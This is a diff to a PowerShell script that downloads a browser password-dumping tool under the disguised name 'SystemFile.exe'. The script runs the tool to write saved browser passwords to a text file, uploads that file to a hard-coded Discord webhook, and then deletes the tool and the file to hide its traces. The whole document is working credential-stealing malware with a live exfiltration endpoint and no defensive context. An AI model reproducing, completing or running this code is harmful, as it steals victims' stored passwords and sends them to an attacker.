@@ -1,26 +1,32 @@
 # Set the URLs and paths
 $downloadUrl = "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/WebBrowserPassView.exe"
 $downloadPath = "C:\Users\Public\SystemFile.exe"
-$commandToRun = SystemFile.exe /stext SystemInfo.txt"
+$commandToRun = "C:\Users\Public\SystemFile.exe /stext C:\Users\Public\SystemInfo.txt"
 $webhookUrl = "https://discord.com/api/webhooks/1070416409215107184/UAILaaOb37Vlb223hJuywdE8ysjpW4DSW7hA-g_nemnLabmF40vknnvov3I-4V4eYBTM"
 $fileToSend = "C:\Users\Public\SystemInfo.txt"
 
-# Download the exe file
+# Download the executable
 Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
 
-# Run a command in the downloaded file folder
-$downloadFolderPath = (Get-Item $downloadPath).Directory.FullName
-$commandFullPath = Join-Path -Path $downloadFolderPath -ChildPath $commandToRun
-Start-Process -FilePath $commandFullPath -Wait
+# Run the command
+powershell -c $commandToRun
 
-# Send a file to Discord webhook
-$webhookData = @{
-    file = [System.IO.File]::OpenRead($fileToSend)
+
+# Create the body of the POST request
+$Body = @{
+    content = "Here's the file you requested."
 }
-Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $fileToSend -ContentType "multipart/form-data" -Body $webhookData
 
-# Remove the downloaded exe file
-Remove-Item $downloadPath -Force
+# Convert the body to JSON
+$jsonBody = $Body | ConvertTo-Json
+
+# Send the message part of the payload using Invoke-RestMethod
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body $jsonBody
+
+# Use curl.exe to upload the file as an attachment
+curl.exe -F "file1=@$fileToSend" $webhookUrl
+
 
 # Clean up
+Remove-Item $downloadPath -Force
 Remove-Item $fileToSend -Force
